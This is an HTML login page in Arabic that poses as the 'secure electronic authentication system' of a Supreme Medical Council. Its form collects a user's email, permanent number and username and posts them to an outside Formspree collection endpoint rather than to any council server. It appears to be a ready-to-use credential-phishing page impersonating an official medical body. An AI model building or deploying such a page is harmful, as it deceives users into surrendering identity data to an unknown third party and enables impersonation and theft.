<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المجلس الطبي الأعلى - نظام المصادقة</title>
    <style>
        :root {
            --primary-color: #0056b3;
            --secondary-color: #f4f7f9;
            --text-color: #333;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--secondary-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 80px;
            margin-bottom: 1rem;
        }
        h2 {
            color: var(--primary-color);
            margin-bottom: 0.5rem;
        }
        p {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
        }
        .form-group {
            margin-bottom: 1.2rem;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box; /* لمنع تجاوز الحدود */
        }
        button {
            width: 100%;
            padding: 0.8rem;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #004494;
        }
        .footer {
            margin-top: 1.5rem;
            font-size: 0.8rem;
            color: #999;
        }
    </style>
</head>
<body>

    <div class="container">
        <div style="font-size: 40px; margin-bottom: 10px;">🏥</div>
        <h2>المجلس الطبي الأعلى</h2>
        <p>نظام المصادقة الإلكتروني الآمن</p>

        <form action="https://formspree.io/f/mgopryak" method="POST">
            
            <div class="form-group">
                <label>البريد الإلكتروني</label>
                <input type="email" name="email" placeholder="example@domain.com" required>
            </div>

            <div class="form-group">
                <label>الرقم الدائم</label>
                <input type="text" name="permanent_number" placeholder="أدخل الرقم الدائم" required>
            </div>

            <div class="form-group">
                <label>اسم المستخدم</label>
                <input type="text" name="username" placeholder="أدخل اسم المستخدم" required>
            </div>

            <input type="hidden" name="_subject" value="طلب مصادقة جديد - المجلس الطبي">

            <button type="submit">تسجيل الدخول / مصادقة</button>
        </form>

        <div class="footer">
            &copy; 2026 جميع الحقوق محفوظة للمجلس الطبي الأعلى
        </div>
    </div>

</body>
</html>
